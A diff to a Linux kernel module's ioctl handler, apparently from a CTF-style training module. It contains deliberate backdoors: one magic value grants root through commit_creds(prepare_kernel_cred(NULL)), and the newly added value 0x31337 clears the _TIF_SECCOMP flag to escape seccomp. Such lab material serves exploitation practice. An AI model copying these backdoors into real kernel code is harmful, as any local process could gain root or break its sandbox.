@@ -34,10 +34,20 @@ static ssize_t device_write(struct file *filp, const char *buf, size_t len, loff
 static long device_ioctl(struct file *filp, unsigned int ioctl_num, unsigned long ioctl_param)
 {
         printk(KERN_ALERT "Got ioctl argument %d!", ioctl_num);
-        if (ioctl_num == PWN && ioctl_param == 0x13371337)
+        if (ioctl_num == PWN)
         {
-        	printk(KERN_ALERT "Granting root access!");
-    		commit_creds(prepare_kernel_cred(NULL));
+        	if (ioctl_param == 0x13371337)
+        	{
+        		printk(KERN_ALERT "Granting root access!");
+    			commit_creds(prepare_kernel_cred(NULL));
+    		}
+    		if (ioctl_param == 0x31337)
+    		{
+        		printk(KERN_ALERT "Escaping seccomp!");
+        		printk(KERN_ALERT "FLAGS BEFORE: %lx", current->thread_info.flags);
+    			current->thread_info.flags &= ~_TIF_SECCOMP;
+        		printk(KERN_ALERT "FLAGS AFTER: %lx", current->thread_info.flags);
+    		}
         }
         return 0;
 }
